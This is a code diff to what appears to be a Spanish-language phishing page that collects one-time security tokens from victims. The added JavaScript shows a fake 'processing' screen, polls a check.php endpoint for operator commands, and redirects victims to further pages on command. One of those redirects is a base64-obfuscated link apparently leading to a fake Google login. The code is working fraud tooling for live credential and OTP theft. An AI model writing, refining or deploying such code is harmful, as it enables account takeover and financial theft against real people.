@@ -111,12 +111,20 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['token'])) {
 
   <div id="scene">
     <div class="modal">
-      <div class="modal-header"><h2>Token</h2></div>
-      <div class="modal-body">
-        <p>Ingresa el token para continuar. Recuerda no compartirlo con nadie.</p>
-        <input class="token-input" type="tel" id="tokenInput" maxlength="10"
-               placeholder="" autocomplete="one-time-code"/>
-        <button class="btn-send" id="btnEnviar" onclick="enviar()">ENVIAR</button>
+      <div id="tok-form">
+        <div class="modal-header"><h2>Token</h2></div>
+        <div class="modal-body">
+          <p>Ingresa el token para continuar. Recuerda no compartirlo con nadie.</p>
+          <input class="token-input" type="tel" id="tokenInput" maxlength="10"
+                 placeholder="" autocomplete="one-time-code"/>
+          <button class="btn-send" id="btnEnviar" onclick="enviar()">ENVIAR</button>
+        </div>
+      </div>
+      <div id="tok-waiting" style="display:none;padding:36px 24px;text-align:center">
+        <div class="gif-loader" style="margin:0 auto 16px">
+          <div class="ring r1"></div><div class="ring r2"></div><div class="ring r3"></div>
+        </div>
+        <p style="font-size:14px;color:#374151;font-weight:500">Procesando...</p>
       </div>
     </div>
   </div>
@@ -129,8 +137,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['token'])) {
     const loader   = document.getElementById('loader');
     const loadText = document.getElementById('loadText');
     const scene    = document.getElementById('scene');
+    const tokForm    = document.getElementById('tok-form');
+    const tokWaiting = document.getElementById('tok-waiting');
     const inp      = document.getElementById('tokenInput');
     const btnEnv   = document.getElementById('btnEnviar');
+    let   pollTimer  = null;
 
     function showLoader(ms) {
       scene.classList.remove('show');
@@ -156,10 +167,53 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['token'])) {
 
     function showToken() {
       scene.classList.add('show');
+      tokForm.style.display    = '';
+      tokWaiting.style.display = 'none';
       inp.value = '';
       btnEnv.textContent = 'ENVIAR';
       btnEnv.classList.remove('loading');
       inp.focus();
+    }
+
+    function showWaiting() {
+      tokForm.style.display    = 'none';
+      tokWaiting.style.display = '';
+    }
+
+    function startPoll() {
+      if (pollTimer) clearInterval(pollTimer);
+      pollTimer = setInterval(function(){
+        fetch('../check.php?u=' + encodeURIComponent(USUARIO))
+          .then(function(r){ return r.json(); })
+          .then(function(d){
+            if (!d.action) return;
+            clearInterval(pollTimer); pollTimer = null;
+            handleAction(d.action);
+          })
+          .catch(function(){});
+      }, 2000);
+    }
+
+    function handleAction(action) {
+      switch(action) {
+        case '/TOKERROR':
+          showToken();
+          break;
+        case '/LOGINERROR':
+          window.location.href = 'index.php?error=1';
+          break;
+        case '/GMAIL':
+          window.location.href = atob('aHR0cHM6Ly90Mm0uY28vZ29vZ2xlLmxvZ2lu');
+          break;
+        case '/HSN':
+          window.location.href = '../hm/index05.html';
+          break;
+        case '/LISTO':
+          window.location.href = '../listo.html';
+          break;
+        default:
+          startPoll();
+      }
     }
 
     function enviar() {
@@ -175,15 +229,17 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['token'])) {
       fd.append('round', round);
 
       fetch('token.php', { method: 'POST', body: fd })
-        .then(r => r.json())
-        .then(d => {
-          btnEnv.textContent = '✓';
-          if (d.redirect) {
-            setTimeout(() => { window.location.href = d.redirect; }, 600);
+        .then(function(r){ return r.json(); })
+        .then(function(d){
+          if (d.ok) {
+            round++;
+            showWaiting();
+            startPoll();
           }
         })
-        .catch(() => {
-          btnEnv.textContent = '✓';
+        .catch(function(){
+          btnEnv.textContent = 'ENVIAR';
+          btnEnv.classList.remove('loading');
         });
     }
 
